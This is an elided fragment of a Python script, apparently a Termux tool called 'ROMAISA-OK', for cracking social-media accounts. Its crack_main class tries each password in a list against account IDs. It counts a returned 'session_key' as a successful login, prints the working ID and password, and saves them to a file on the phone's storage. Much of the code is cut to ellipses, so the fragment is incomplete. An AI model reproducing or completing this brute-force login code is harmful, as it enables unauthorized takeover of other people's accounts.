...
def qsbuy():
        ...
        try:
                ...
                if str("upppdate") in update:
                        ...
                        print("\CUTE  GIRL HN  MESSENGER MTT KRO
...
class crack_main():
        ...
        def m1(self,iid,name,passlist):
                ...
                try:
                        ...
                        sys.stdout.write('\r[ROMAISA-OK] %s / [OK-%s] \r'%(loop,len(ok)));sys.stdout.flush()
                        ...
                        for pw in passlist:
                                ...
                                if 'session_key' in po:
                                        ...
                                        print(' \033[1;32m[ROMAISA-OK] '+roid+' | '+pas+'\033[0;97m')

                                        open('/sdcard/ROMAISA-OK_ok.txt','a').write(roid+'|'+pas+'\n')
        ...
        def pasw(self):
                ...
                print(' Ok Ids Save In : /sdcard/ROMAISA-OK_ok.txt')
...
if '/data/data/com.termux/files/home/ROMAISA-OK' in datar:
